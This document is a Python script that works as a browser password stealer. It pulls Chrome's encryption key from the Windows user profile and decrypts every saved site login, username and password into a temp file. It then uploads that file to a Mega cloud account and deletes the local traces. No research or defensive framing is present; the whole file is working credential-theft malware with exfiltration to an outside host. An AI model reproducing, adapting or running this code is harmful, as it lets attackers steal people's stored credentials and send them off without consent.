from os import path , environ , getcwd , chdir , remove
from sys import exit
from json import loads
from base64 import b64decode
from sqlite3 import connect
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from  shutil import copyfile
from mega import Mega
from time import sleep
from datetime import timezone, datetime, timedelta
pa = getcwd()
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    local_state_path = path.join(environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)

    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
def main():
    key = get_encryption_key()
    db_path = path.join(environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")

    filename = "ChromeData.db"
    copyfile(db_path, filename)
    db = connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            paTh = chdir(environ["temp"])
            with open ("pass.txt" , mode="a" ,encoding="utf-8") as f:
            	f.writelines(str(f"Origin URL: {origin_url}")+"\n\n"+str(f"Action URL: {action_url}")+"\n\n"+str(f"Username: {username}")+"\n\n"+str(f"Password: {password}")+"\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            p = f"Creation date: {str(get_chrome_datetime(date_created))}"
        if date_last_used != 86400000000 and date_last_used:
            pr = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
    cursor.close()
    db.close()
def up(email,password):
	main()
	path = chdir(pa)
	remove("ChromeData.db")
	paTh = chdir(environ["temp"])
	mega = Mega()
	m = mega.login(email, password)
	mega.upload("pass.txt")
	remove("pass.txt")

